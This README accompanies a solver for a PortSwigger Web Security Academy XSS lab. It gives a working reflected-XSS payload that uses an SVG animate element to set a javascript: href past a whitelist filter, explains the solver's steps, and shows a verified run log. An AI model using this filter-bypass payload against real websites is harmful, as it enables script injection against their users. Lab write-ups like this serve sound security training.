# Reflected XSS with event handlers and href attributes blocked

**Difficulty:** EXPERT · **Topic:** Cross-site scripting → Contexts · **Lab:** [Academy page](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

The blog search term is reflected unescaped into the results heading, and a
server-side whitelist blocks `on*` event handlers, `href` attributes and
non-whitelisted tags — but still permits `svg`, `a`, `animate` and `text`.

## Objective

Inject a vector that calls `alert` **when clicked**, and label it with the word
"Click" so the simulated lab user clicks it.

## Exploit

```
/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

`<animate>` sets the forbidden `href` attribute at render time, after the
filter has already inspected the request, turning the `<text>` into a
`javascript:` link.

```html
<h1>0 search results for '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>'</h1>
```

## Usage

```bash
cd EXPERT/Reflected-XSS-with-event-handlers-and-href-attributes-blocked
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"

# print the crafted URL without sending it (for a manual browser check)
uv run python solve.py --url "https://<lab-id>.web-security-academy.net" --show-url
```

Exit codes: `0` verified solved · `1` exploit sent, lab not solved ·
`2` usage/environment · `3` lab unreachable/expired.

## What the solver does

1. `GET /` — verifies the page `<title>` is this lab, records the authoritative
   `widgetcontainer-lab-status` baseline, and reads the search parameter name
   from the live form (nothing hardcoded).
2. Control requests — asserts an event handler, an `href` attribute and a
   non-whitelisted tag each still return HTTP 400 with the exact reason string
   (`"Event is not allowed"`, `"Attribute is not allowed"`, `"Tag is not
   allowed"`). That is the precondition the `animate` trick exists to defeat.
3. Capability probe — confirms `svg`, `a`, `animate` and `text` are still
   whitelisted, so a changed filter fails loudly instead of sending a useless
   payload.
4. Exploit request — asserts the response reflects the vector **unescaped**
   (raw `<animate attributeName=href ...>` plus the "Click me" label).
5. Polls `GET /` until the widget reports `is-solved` / `Solved`, then reports
   request count and elapsed time.

Nothing instance-specific is hardcoded: the host, search parameter, baseline
state and all filter strings come from `--url` and the live responses.

## Verified run

```
[   0.4s] baseline status : not solved
[   0.8s] control event handler        : HTTP 400 '"Event is not allowed"' -> blocked as expected
[   1.2s] control href attribute       : HTTP 400 '"Attribute is not allowed"' -> blocked as expected
[   1.5s] control non-whitelisted tag  : HTTP 400 '"Tag is not allowed"' -> blocked as expected
[   2.9s] tag text         : HTTP 200
[   3.3s] reflected h1    : 0 search results for '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>'
lab status      : SOLVED
caused by solver: yes
HTTP requests   : 10
elapsed         : 3.7s
```

Launcher from the repository root: exact folder-name match, exit 0.
Browser check: a trusted click on the `<text>` node fires `alert("1")`.

See `SOLUTION.md` for the reproducible steps, `REPORT.md` for the case study,
and `RESUME.md` / `LESSONS_LEARNED.md` for the working notes.
